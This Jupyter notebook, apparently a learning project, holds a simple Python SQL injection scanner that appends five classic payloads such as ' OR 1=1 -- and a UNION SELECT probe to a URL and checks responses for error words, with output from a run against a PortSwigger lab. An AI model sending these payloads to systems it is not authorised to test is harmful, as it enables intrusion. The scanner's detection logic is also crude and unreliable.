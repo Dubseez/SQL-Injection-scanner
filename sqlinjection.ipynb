{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "8698b64b",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Enter the URL to scan (with parameters): https://portswigger-labs.net/sql-injection-lab?category=Gifts\n",
      "Scanning https://portswigger-labs.net/sql-injection-lab?category=Gifts for SQL injection vulnerabilities...\n",
      "\n",
      "Testing payload: ' OR 1=1 --\n",
      "No SQL Injection vulnerability detected with payload: ' OR 1=1 --\n",
      "\n",
      "Testing payload: ' OR 'a'='a\n",
      "No SQL Injection vulnerability detected with payload: ' OR 'a'='a\n",
      "\n",
      "Testing payload: ' OR 1=1#\n",
      "No SQL Injection vulnerability detected with payload: ' OR 1=1#\n",
      "\n",
      "Testing payload: ' AND 1=1 --\n",
      "No SQL Injection vulnerability detected with payload: ' AND 1=1 --\n",
      "\n",
      "Testing payload: ' UNION SELECT NULL, NULL, NULL --\n",
      "No SQL Injection vulnerability detected with payload: ' UNION SELECT NULL, NULL, NULL --\n",
      "\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "\n",
    "# List of common SQL injection payloads\n",
    "payloads = [\n",
    "    \"' OR 1=1 --\",\n",
    "    \"' OR 'a'='a\",\n",
    "    \"' OR 1=1#\",\n",
    "    \"' AND 1=1 --\",\n",
    "    \"' UNION SELECT NULL, NULL, NULL --\"\n",
    "]\n",
    "\n",
    "def scan_sql_injection(url):\n",
    "    print(f\"Scanning {url} for SQL injection vulnerabilities...\\n\")\n",
    "\n",
    "    # Loop through each payload to test for vulnerabilities\n",
    "    for payload in payloads:\n",
    "        print(f\"Testing payload: {payload}\")\n",
    "        # Create the test URL with the payload\n",
    "        test_url = f\"{url}{payload}\"\n",
    "\n",
    "        try:\n",
    "            # Send a request to the URL with the payload\n",
    "            response = requests.get(test_url)\n",
    "            \n",
    "            # Check if the response contains error messages or unusual behavior\n",
    "            if \"error\" in response.text.lower() or \"warning\" in response.text.lower():\n",
    "                print(f\"Possible SQL Injection detected with payload: {payload}\\n\")\n",
    "            else:\n",
    "                print(f\"No SQL Injection vulnerability detected with payload: {payload}\\n\")\n",
    "        except requests.RequestException as e:\n",
    "            print(f\"Error testing URL {test_url}: {e}\")\n",
    "\n",
    "if __name__ == \"__main__\":\n",
    "    # Input URL to scan\n",
    "    url = input(\"Enter the URL to scan (with parameters): \")\n",
    "    scan_sql_injection(url)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "cb96279d",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.9"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
